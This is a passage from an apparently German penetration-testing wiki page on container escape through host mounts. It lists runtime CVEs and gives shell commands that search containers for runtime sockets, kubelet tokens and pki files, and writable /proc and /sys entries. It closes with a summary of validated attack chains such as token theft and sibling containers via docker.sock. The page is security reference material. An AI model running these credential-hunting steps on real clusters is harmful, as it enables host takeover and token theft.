Überprüfung, kein Beweis für die Ausführung mit Host-root-Rechten. Untersuche Mount- und Dateimetadaten, ohne eine mögliche ausführbare Datei auszuführen.

## Mount-bezogene CVEs

Host-Mounts spielen auch bei Runtime-Schwachstellen eine Rolle. Wichtige aktuelle Beispiele sind:

- `CVE-2024-21626` in `runc`, bei der ein leaked Verzeichnis-Dateideskriptor das Arbeitsverzeichnis im Host-Dateisystem platzieren konnte.
- `CVE-2024-23651`, `CVE-2024-23652` und `CVE-2024-23653` in BuildKit, bei denen schädliche Dockerfiles, Frontends und `RUN --mount`-Abläufe während Builds erneut Zugriff auf Host-Dateien, deren Löschung oder erhöhte Berechtigungen ermöglichen konnten.
- `CVE-2024-1753` in Buildah- und Podman-Build-Abläufen, bei der manipulierte bind mounts während des Builds `/` mit Lese- und Schreibzugriff verfügbar machen konnten.
- `CVE-2025-47290` in `containerd` 2.1.0, bei der ein TOCTOU während des Entpackens eines Images einem speziell präparierten Image ermöglichen konnte, das Host-Dateisystem während des Pulls zu verändern.

Diese CVEs sind hier relevant, weil sie zeigen, dass Mount-Verarbeitung nicht nur von der Konfiguration durch den Betreiber abhängt. Auch die Runtime selbst kann Mount-bedingte Escape-Bedingungen schaffen.

## Prüfungen

Verwende diese Befehle, um die wichtigsten Mount-Exposures schnell zu finden:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Was hier interessant ist:

- Host-root, `/proc`, `/sys`, `/var` und Runtime-Sockets sind allesamt Befunde mit hoher Priorität.
- Schreibbare proc/sys-Einträge bedeuten oft, dass der Mount globale Kernel-Steuerungen des Hosts statt einer sicheren Container-Ansicht offenlegt.
- Eingehängte `/var`-Pfade erfordern eine Prüfung von Zugangsdaten und benachbarten Workloads, nicht nur eine Prüfung des Dateisystems.
- Kubelet-State-Verzeichnisse und CNI-/Plugin-Pfade verdienen dieselbe Priorität wie Runtime-Sockets, da sie oft direkt am Pfad für die Pod-Erstellung und die Verteilung von Zugangsdaten auf dem Node liegen.

## Status der lokalen Validierung

Die praktischen Angriffsketten auf dieser Seite wurden auf einem lokalen Linux-minikube-Node überprüft. Bei der Validierung wurden folgende Ergebnisse reproduziert:

- Lese- und Schreibzugriff über einen temporären, beschreibbaren hostPath
- Auffinden projizierter ServiceAccount-Tokens und eingehängter Secrets über `/var/lib/kubelet/pods`
- erfolgreiche Kubernetes-API-Authentifizierung mit einem gültigen Token, das aus diesem eingehängten Kubelet-State wiederhergestellt wurde
- schreibgeschütztes Auffinden eines benachbarten Docker-`overlay2`-Dateisystems über einen eingehängten `/var`-Pfad
- Erstellung eines Geschwister-Containers über die Docker API mit einem schreibgeschützten Host-Bind über einen eingehängten `docker.sock`
- verzögerte Host-Ausführung über einen temporären Hook, der vom Host verarbeitet wird
- eine CNI-Wrapper-Simulation, bei der die Argumente, die Standardeingabe und die Ausführung des ursprünglichen Plugins erhalten blieben

Auf demselben Node waren `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` und `config.gz` verfügbar, aber nicht `uevent_helper`, EFI-Variablen, Thermal-Einträge oder `sched_debug`. Destruktive Kernel-Trigger wurden nicht ausgeführt. Dies bestätigt, dass Angriffsketten über Host-root, `/var`, den Kubelet-State, Sockets und Host-Consumer reproduzierbar sind. Procfs-/sysfs-Helfertechniken müssen dagegen vom jeweiligen Kernel, Mount-Modus, Payload-Pfad und Trigger abhängig bleiben.

## References

- [1] [Lokale Dateien und Pfade, die vom Kubelet verwendet werden](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Der cilium-agent-Container kann über einen `hostPath`-Mount auf den Host zugreifen](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
